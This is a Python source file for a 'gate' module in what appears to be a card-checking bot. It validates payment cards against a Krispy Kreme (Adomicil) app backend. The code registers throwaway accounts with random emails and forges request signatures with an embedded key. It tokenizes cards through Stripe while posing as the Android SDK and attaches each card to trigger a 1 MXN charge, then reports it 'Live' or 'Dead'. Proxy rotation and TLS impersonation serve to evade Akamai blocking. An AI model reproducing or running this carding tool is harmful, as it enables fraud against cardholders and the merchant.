# bot/gates/krispy.py
"""Gate Krispy Kreme (Adomicil) — CCN CHARGED 1 MXN.

Sin CVV efectivo: la app asocia la tarjeta y eso dispara el cargo, igual que
ParkingPay. El CVC viaja dentro del token de Stripe pero el backend decide si
lo verifica; se manda para replicar el comportamiento de la app.

Flujo por tarjeta (una cuenta por tarjeta, cuentas siempre frescas):
    GetConfig (cacheado) -> SignupClient(email como login) ->
    POST /v1/tokens (pua stripe-android) -> Payment/Card/Add -> Payment/Card/List

La firma va en cada request: md5(signatureKey + material ordenado
case-insensitive y en minusculas). El body va en {"Auth": {...}, "Data": {...}}
y la firma se calcula sobre {Auth sin Signature, Data}.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import random
import string
import time
import uuid
from datetime import datetime
from typing import Dict, Optional

try:
    from curl_cffi import requests as _creq
    _BACKEND = "curl_cffi"
except ImportError:  # fallback; pierde huella TLS y Akamai puede 403
    try:
        import cloudscraper as _creq
        _BACKEND = "cloudscraper"
    except ImportError:
        import httpx as _creq
        _BACKEND = "httpx"

logger = logging.getLogger(__name__)

GATE_NAME = "KrispyKreme"
MONTO = 1.0

SIG_KEY = "TR#SC=_AD56MINDA+BL*IOL.#ibn1?9"
GETCONF = "https://admin.adomicil.io/App/AppWS/GetConfig"
CONFIG_ID = 169
BASE = "https://krispykreme.adomicil.io"
STRIPE = "https://api.stripe.com/v1/tokens"
PUA = "stripe-android/20.26.0"

BRANDS = {"visa": "VISA", "mastercard": "MASTERCARD", "amex": "AMEX",
          "american express": "AMEX", "discover": "DISCOVER",
          "diners club": "DINERS", "jcb": "JCB"}

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")

_DOMINIOS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

_CONFIG_TTL = 3600
_config_cache: Dict[str, object] = {"ts": 0, "pk": None, "services": {}}

CONTROL_CARD = (os.getenv("KRISPY_CONTROL_CARD") or "4532640527811642").strip()
_control_state: Optional[str] = None  # None | "ok" | "degradado"
_signup_429_until = 0.0

# Todo el flujo (GetConfig, signup, token, Add, List y control) sale por un
# sticky MX con lifetime, uno nuevo por tarjeta. No se permite salida directa.
_stripe_proxy_ok: Optional[bool] = None


class _AkamaiBloqueo(Exception):
    """403 de Akamai: conviene rotar proxy."""


# ---------------------------------------------------------------------------
# Firma
# ---------------------------------------------------------------------------
def _flatten(obj, prefix: str, out: list) -> None:
    if obj is None or isinstance(obj, bool):
        return
    if isinstance(obj, str):
        if len(obj) <= 1000:
            out.append(f"{prefix}={obj}")
        return
    if isinstance(obj, (int, float)):
        out.append(f"{prefix}={obj}")
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            _flatten(v, f"{prefix}.{k}" if prefix else str(k), out)
        return
    if isinstance(obj, (list, tuple)):
        for i, v in enumerate(obj):
            if isinstance(v, dict):
                _flatten(v, f"{prefix}.{i}" if prefix else str(i), out)


def _signature(body: dict) -> str:
    out: list = []
    _flatten(body, "", out)
    out.sort(key=lambda s: s.lower())
    joined = "&".join(out).lower()
    return hashlib.md5((SIG_KEY + joined).encode("utf-8")).hexdigest()


def _envelope(login: str, pwd: str, data: str, platform: str, payload: dict) -> dict:
    auth = {
        "Timestamp": int(time.time() * 1000),
        "CredentialLogin": login,
        "CredentialPwd": pwd,
        "CredentialPlatform": platform,
        "CredentialData": data,
    }
    body = {"Auth": auth, "Data": payload}
    auth["Signature"] = _signature(body)
    return body


# ---------------------------------------------------------------------------
# Cliente
# ---------------------------------------------------------------------------
def _nuevo_cliente(proxies: Optional[dict]):
    if _BACKEND == "curl_cffi":
        s = _creq.Session(impersonate="chrome")
        s.headers.update({"Accept": "application/json", "User-Agent": UA})
        if proxies:
            s.proxies = proxies
        return s
    if _BACKEND == "cloudscraper":
        s = _creq.create_scraper()
        s.headers.update({"Accept": "application/json", "User-Agent": UA})
        if proxies:
            s.proxies = proxies
        return s
    s = _creq.Client(timeout=90, follow_redirects=True)
    s.headers.update({"Accept": "application/json", "User-Agent": UA})
    if proxies:
        s.proxies = proxies
    return s


def _cerrar(s) -> None:
    try:
        s.close()
    except Exception:
        pass


def _request(s, url: str, body: Optional[dict] = None, timeout: int = 60):
    headers = {"Content-Type": "application/json; charset=utf-8",
               "Accept": "application/json", "User-Agent": UA}
    if body is None:
        r = s.get(url, headers=headers, timeout=timeout)
    else:
        r = s.post(url, json=body, headers=headers, timeout=timeout)
    if r.status_code == 403:
        raise _AkamaiBloqueo()
    if r.status_code == 429:
        logger.warning("Krispy 429 (Too Many Requests) en %s", url)
    return r


# ---------------------------------------------------------------------------
# Config remota (pk + servicios)
# ---------------------------------------------------------------------------
def _config(proxies: Optional[dict] = None) -> dict:
    if _config_cache["pk"] and (time.time() - float(_config_cache["ts"])) < _CONFIG_TTL:
        return _config_cache
    s = _nuevo_cliente(proxies)
    try:
        u = f"{int(time.time() * 1000)}-{uuid.uuid4()}"
        body = _envelope(u, u, u, "uuid", {"AppConfigId": CONFIG_ID})
        r = _request(s, GETCONF, body, timeout=45)
        data = r.json()["Data"]["DataConfig"]
        _config_cache["pk"] = data["payment"]["paymentStripePublicKey"]
        _config_cache["services"] = data.get("services", {})
        _config_cache["ts"] = time.time()
        logger.debug("Krispy config cargada: tokenization=%s",
                     data["payment"].get("paymentTokenizationTypeId"))
    finally:
        _cerrar(s)
    return _config_cache


def _svc(key: str, default: str) -> str:
    # Lee del cache ya cargado por _config(proxies); nunca dispara una
    # petición directa por su cuenta.
    return (_config_cache.get("services") or {}).get(key, default)


# ---------------------------------------------------------------------------
# Datos de la cuenta
# ---------------------------------------------------------------------------
def _rand(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _email() -> str:
    return f"{_rand(7)}{int(time.time() * 1000) % 100000}@{random.choice(_DOMINIOS)}"


# ---------------------------------------------------------------------------
# Flujo
# ---------------------------------------------------------------------------
def _paso_signup(s, login: str, pwd: str) -> None:
    url = _svc("client_signup_user", BASE + "/User/Signup/Client")
    payload = {
        "User": {
            "UserFirstName": "GATE",
            "UserLastName": "PROBE",
            "CredentialList": [{
                "CredentialLogin": login, "CredentialPwd": pwd,
                "CredentialPlatform": "mail", "CredentialData": login,
            }],
            "Client": {"ClientToken": {
                "ClientTokenPlatform": "mail", "ClientTokenCode": login,
            }},
        },
        "PlatformId": "mail",
    }
    r = _request(s, url, _envelope(login, pwd, login, "mail", payload))
    if '"ReturnCode":200' not in (r.text or ""):
        raise RuntimeError(f"signup: {(r.text or '')[:90]}")


def _paso_login(s, login: str, pwd: str) -> None:
    """Login explícito tras el signup, igual que el flujo base de justo.py.

    El signup crea la credencial, pero el AddCard exitoso de justo.py se hizo
    después de un Login/Client; sin este paso el backend puede tratar la
    sesión como no confirmada y el emisor declina la tarjeta.
    """
    url = BASE + "/User/Login/Client"
    r = _request(s, url, _envelope(login, pwd, login, "mail", {}))
    if '"ReturnCode":200' not in (r.text or ""):
        raise RuntimeError(f"login: {(r.text or '')[:90]}")


def _paso_token(pk: str, cc: str, mes: str, ano: str, cvv: str,
                proxies: Optional[dict] = None):
    """Tokeniza en Stripe por el proxy indicado. No usa salida directa."""
    global _stripe_proxy_ok
    if not proxies:
        return None, "proxy/token: sin proxy"
    s = _nuevo_cliente(proxies)
    try:
        r = s.post(STRIPE, data={
            "key": pk, "payment_user_agent": PUA,
            "card[number]": cc, "card[exp_month]": mes,
            "card[exp_year]": ano, "card[cvc]": cvv,
        }, headers={"Accept": "application/json", "User-Agent": UA}, timeout=30)
        j = r.json()
        _stripe_proxy_ok = True
        if "id" in j:
            card = j.get("card") or {}
            brand = (card.get("brand") or "")
            return j["id"], BRANDS.get(brand.lower(), brand.upper())
        e = j.get("error") or {}
        return None, f"{e.get('code')}: {(e.get('message') or '')[:60]}"
    except Exception as exc:
        _stripe_proxy_ok = False
        logger.warning("Krispy token por proxy falló (%s)",
                       type(exc).__name__)
        return None, f"proxy/token: {type(exc).__name__}"
    finally:
        _cerrar(s)


def _paso_add(s, u: str, pwd: str, token: str, cc: str, mes: str, ano: str,
              cvv: str, brand: str, email: str):
    url = BASE + "/Payment/Card/Add"
    payload = {"Card": {
        "DeviceId": "fake device id",
        "CardToken": token,
        "CardHolderFirstName": "GATE", "CardHolderLastName": "PROBE",
        "CardHolderName": "GATE PROBE",
        "CardExpirationYear": "20" + ano, "CardExpirationMonth": mes,
        "CardLast4": cc[-4:], "CardBrand": brand.upper(),
        "Cardcvv": cvv, "CardPhone": "5512345678",
        "CardEmail": email, "CardIsCredit": True, "CardBankName": "",
        "CardStreet": "", "CardNoExt": "", "CardNoInt": "",
        "CardNeighborhood": "", "CardZipCode": "", "CardMunicipality": "",
        "StateId": "",
        "EncryptedCardNumber": "", "EncryptedExpiryMonth": "",
        "EncryptedExpiryYear": "", "EncryptedSecurityCode": "",
    }}
    return _request(s, url, _envelope(u, pwd, u, "mail", payload))


def _paso_list(s, u: str, pwd: str) -> list:
    url = BASE + "/Payment/Card/List"
    r = _request(s, url, _envelope(u, pwd, u, "mail", {}))
    try:
        return r.json().get("Data", {}).get("CardList", [])
    except Exception:
        return []


def _split_code(msg: str) -> str:
    return (msg or "").split(":", 1)[0].strip()


def _control_probe(proxies: Optional[dict]) -> str:
    """PAN Luhn-válido inexistente: debe devolver `incorrect_number`.
    Si también devuelve `card_declined`, el endpoint rechaza todo."""
    if not proxies:
        return "sin_proxy"
    pk = _config(proxies)["pk"]
    if not pk:
        return "sin_pk"
    email = _email()
    pwd = "Gate" + _rand(8)
    s = _nuevo_cliente(proxies)
    try:
        _paso_signup(s, email, pwd)
        _paso_login(s, email, pwd)
        token, err = _paso_token(pk, CONTROL_CARD, "12", "30", "123", proxies)
        if not token:
            codigo = _split_code(err)
            if codigo in ("incorrect_number", "invalid_number",
                          "card_declined", "expired_card"):
                return codigo
            return f"token:{err}"
        r = _paso_add(s, email, pwd, token, CONTROL_CARD, "12", "30", "123",
                      "visa", email)
        resp = (r.json() or {}).get("Response", {})
        return _split_code(resp.get("ReturnMessage", ""))
    except Exception as exc:
        return f"exc:{type(exc).__name__}"
    finally:
        _cerrar(s)


def _flujo_completo(cc: str, mes: str, ano: str, cvv: str,
                    proxies: Optional[dict]) -> Dict[str, str]:
    """Bloqueante. Un ciclo por tarjeta: cuenta nueva, nunca reutilizada."""
    global _signup_429_until
    if not proxies:
        return {"status": "⚠️ Error",
                "message": "Sin proxy (salida directa prohibida)"}
    inicio = datetime.now()
    if time.time() < _signup_429_until:
        return {"status": "⚠️ Error",
                "message": "IP limitada (429), intenta en 2 minutos"}

    def t() -> str:
        return f"{(datetime.now() - inicio).total_seconds():.2f}"

    cfg = _config(proxies)
    pk = cfg["pk"]
    if not pk:
        return {"status": "⚠️ Error", "message": "Sin pk (GetConfig)"}

    email = _email()
    pwd = "Gate" + _rand(8)
    u = email                      # el login ES el correo
    s = _nuevo_cliente(proxies)
    try:
        try:
            for intento in range(3):
                try:
                    _paso_signup(s, u, pwd)
                    break
                except _AkamaiBloqueo:
                    raise
                except Exception as exc:
                    if ("Too Many Requests" in str(exc)
                            and intento < 2):
                        espera = (3, 8)[intento]
                        logger.warning(
                            "Krispy signup 429, reintento en %ss", espera)
                        time.sleep(espera)
                        continue
                    logger.warning("Krispy signup falló: %s", exc)
                    if "Too Many Requests" in str(exc):
                        _signup_429_until = time.time() + 120
                    return {"status": "⚠️ Error",
                            "message": "No se pudo crear la sesión"}
        except _AkamaiBloqueo:
            raise

        try:
            _paso_login(s, u, pwd)
            logger.info("Krispy login OK last4=%s", cc[-4:])
        except _AkamaiBloqueo:
            raise
        except Exception as exc:
            logger.warning("Krispy login falló: %s", exc)
            return {"status": "⚠️ Error",
                    "message": "No se pudo iniciar la sesión"}

        token, brand_o_err = _paso_token(pk, cc, mes, ano, cvv, proxies)
        if not token:
            logger.info("Krispy token FALLO last4=%s: %s", cc[-4:], brand_o_err)
            err = (brand_o_err or "").lower()
            # Fallo de transporte (proxy/directo caído, timeout, 5xx) no es
            # veredicto de la tarjeta: se reporta como Error para reintentar.
            if (err.startswith("proxy/token:")
                    or err.startswith("http")
                    or "timeout" in err
                    or "connection" in err
                    or "api_connection_error" in err
                    or "rate_limit" in err):
                return {"status": "⚠️ Error",
                        "message": f"Token: {brand_o_err[:60]}"}
            return {"status": "❌ Dead", "message": f"{brand_o_err} - {t()} segundos"}
        logger.info("Krispy token OK last4=%s brand=%s", cc[-4:], brand_o_err)

        r = _paso_add(s, u, pwd, token, cc, mes, ano, cvv, brand_o_err, email)
        resp = (r.json() or {}).get("Response", {})
        rc = resp.get("ReturnCode")
        msg = resp.get("ReturnMessage", "") or ""
        logger.info("Krispy add last4=%s rc=%s msg=%s", cc[-4:], rc, msg[:120])

        # el email puede tardar en propagarse: un reintento
        if rc != 200 and "email_invalid" in msg.lower():
            time.sleep(1.0)
            r = _paso_add(s, u, pwd, token, cc, mes, ano, cvv, brand_o_err, email)
            resp = (r.json() or {}).get("Response", {})
            rc = resp.get("ReturnCode")
            msg = resp.get("ReturnMessage", "") or ""
            logger.info("Krispy add retry last4=%s rc=%s msg=%s",
                        cc[-4:], rc, msg[:120])

        # Sin salida directa: el veredicto se decide con el flujo proxy.
        if rc == 200:
            # confirmación: la tarjeta tiene que estar en la cartera.
            # El backend puede tardar en reflejarla: se revisa con un reintento
            # y comparando last4 como texto (puede venir número en el JSON).
            last4 = str(cc[-4:])
            cartera: list = []
            confirmada = False
            for intento in range(2):
                try:
                    cartera = _paso_list(s, u, pwd)
                except Exception:
                    cartera = []
                confirmada = any(
                    str(c.get("CardLast4") or "").zfill(4) == last4
                    for c in cartera
                )
                if confirmada or not cartera:
                    break
                time.sleep(1.0)
            if cartera and not confirmada:
                logger.warning(
                    "Krispy aprobada sin confirmar en cartera last4=%s cards=%s",
                    last4, [c.get("CardLast4") for c in cartera],
                )
                return {"status": "⚠️ Error",
                        "message": "Pago aprobado, no se pudo confirmar en cartera"}
            return {"status": "✅ Live",
                    "message": f"Charger {MONTO} MXN - {t()} segundos"}

        low = msg.lower()
        if ("no autorizado" in low or "usuario no existe" in low
                or "email_invalid" in low or "token_already_used" in low
                or "processing_error" in low):
            logger.warning("Krispy error de sesion/procesador last4=%s: %s",
                           cc[-4:], msg[:120])
            return {"status": "⚠️ Error", "message": f"Sesión: {msg[:50]}"}

        if _split_code(msg) == "card_declined":
            global _control_state
            if _control_state is None:
                control = _control_probe(proxies)
                if control == "incorrect_number":
                    _control_state = "ok"
                elif control == "card_declined":
                    _control_state = "degradado"
                else:
                    # El control no pudo ejecutarse (pk, token, red): no se
                    # puede culpar a la tarjeta.
                    return {"status": "⚠️ Error",
                            "message": f"Control no concluyente: {control[:40]}"}
                logger.warning("Krispy control %s -> %s (%s)",
                               CONTROL_CARD[-4:], control, _control_state)
            if _control_state == "degradado":
                return {"status": "⚠️ Error",
                        "message": "El procesador rechaza todas las tarjetas"}

        return {"status": "❌ Dead", "message": f"{msg[:45]} - {t()} segundos"}
    finally:
        _cerrar(s)


# ---------------------------------------------------------------------------
# API pública (misma forma que el resto de gates)
# ---------------------------------------------------------------------------
async def gate_krispy_check(card_data: str, user_id: int,
                            shared_proxies: Optional[dict] = None) -> Dict[str, str]:
    # Todo el flujo del sitio (GetConfig, signup, Add, List y control) sale
    # por un sticky MX con lifetime, uno nuevo por tarjeta. Nunca directo.
    if not shared_proxies:
        from bot.services.proxies import gate_proxy as _gate_proxy
        _url = _gate_proxy("mx")
        if not _url:
            return {"status": "⚠️ Error",
                    "message": "Sin proxy disponible (salida directa prohibida)"}
        shared_proxies = {"http": _url, "https": _url}
    try:
        parts = [p.strip() for p in card_data.split("|")]
        if len(parts) != 4:
            return {"status": "❌ Dead", "message": "Formato inválido"}
        cc, mes, ano, cvv = parts
        if not cc.isdigit() or not (13 <= len(cc) <= 19):
            return {"status": "❌ Dead", "message": "Número inválido"}
        mes = mes.zfill(2)
        if not (1 <= int(mes) <= 12):
            return {"status": "❌ Dead", "message": "Mes inválido"}
        ano = str(ano)[-2:].zfill(2)
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            cvv = "".join(random.choices("0123456789", k=3))

        return await asyncio.to_thread(_flujo_completo, cc, mes, ano, cvv,
                                       shared_proxies)
    except _AkamaiBloqueo:
        return {"status": "⚠️ Error", "message": "Akamai 403 - intenta más tarde"}
    except Exception as exc:
        logger.exception("Error REAL en Krispy: %s", exc)
        return {"status": "⚠️ Error", "message": "Error avisar a un administrador"}